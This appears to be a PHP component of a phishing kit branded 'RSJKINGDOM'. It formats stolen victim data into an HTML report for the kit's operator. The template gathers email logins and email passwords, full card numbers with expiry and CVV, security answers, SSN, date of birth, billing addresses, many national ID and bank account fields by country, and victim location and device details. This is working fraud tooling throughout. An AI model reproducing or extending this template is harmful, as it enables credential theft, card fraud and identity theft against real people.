<?php @error_reporting(0);
$data = "
    
     <html>
		    <body>
		    ##=========== RSJKINGDOM ===========##<br><br>
[#] Email           :  ". $userid . "<br>
[#] Password		:  " . $password . "<br>
[#] Email Password	:  " . $epass . "<br>
<p style='margin: 0;font-size: 12px;line-height: 24px'>++====================== [ Credit ] ====================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
[#] Cardholder Name :  ". $ccname . "<br>
[#] Card Number		:  " . $ccno . "<br>
[#] Exp Date		:  " . $ccexp . "<br>
[#] Cvv2			:  " . $secode . "<br>
[#] For Check       :  " . $ccno . " / " . $ccexp . " / " . $secode . "<br>
[#] BIN/IIN Info	:  " . $ccbrand . " - " . $cclevel . " - " . $cctype . " - " . $ccbank . "<br>
[#] Sec Question	:  " . $q1 . "<br>
[#] Sec Answer		:  " . $a1 . "<br></p>
<p style='margin: 0;font-size: 12px;line-height: 24px'>++====================== [ Billing ] ====================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
[#] Full Name   	:  " . $name . "<br>
[#] Address			:  " . $address . "<br>
[#] City/Town		:  " . $city . "<br>
[#] State			:  " . $state . "<br>
[#] Zip/PostCode	:  " . $postcode . "<br>
[#] Country			:  " . $nama_negara . "<br>
[#] Phone Number	:  " . $telephone . "<br>
[#] SSN				:  " . $ssn . "<br>
[#] DOB				:  " . $dob . "<br>++===================== [ Other ] ====================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
[#] Account Number (UK/IE/IN/TH)	    : " . $acno . "<br>
[#] Citizen ID (TH)					    : " . $citizenid . "<br>
[#] Credit Limit (IE/TH/IN/AU/NZ/SA)	: " . $climit . "<br>
[#] Bank Access Number (NZ)			    : " . $bans . "<br>
[#] NAB ID (AU)			    	        : " . $nabid . "<br>
[#] Bank Account (AU)			    	: " . $bankaccount . "<br>
[#] Sortcode (UK/IE)			      	: " . $sort . "<br>
[#] Passport (CY)					    : " . $passport . "<br>
[#] Qatar ID (QA)					    : " . $qatarid . "<br>
[#] National ID (SA)			    	: " . $naid . "<br>
[#] Civil ID Number (KW)			    : " . $civilid . "<br>
[#] ID Number (GR/HK)		    		: " . $numbid . "<br>
[#] Card ID (JP)                        :  ". $cardid."<br>
[#] Card Password (JP)                  :  ". $cardpassword."<br>+=================== [ Device Info ] ==================++</p><p style='margin: 0;font-size: 12px;line-height: 24px'>
[#] From            :	".$VictimInfo1."<br>
[#] Location        :	".$VictimInfo2."<br>
[#] Platform        :	".$os."<br>
[#] Browser         :	".$br."</p>
<br><br>
<br>
<br>
               ==================[RSJKINGDOM]==================

		    </body>
	    </html>

    
    ";
?>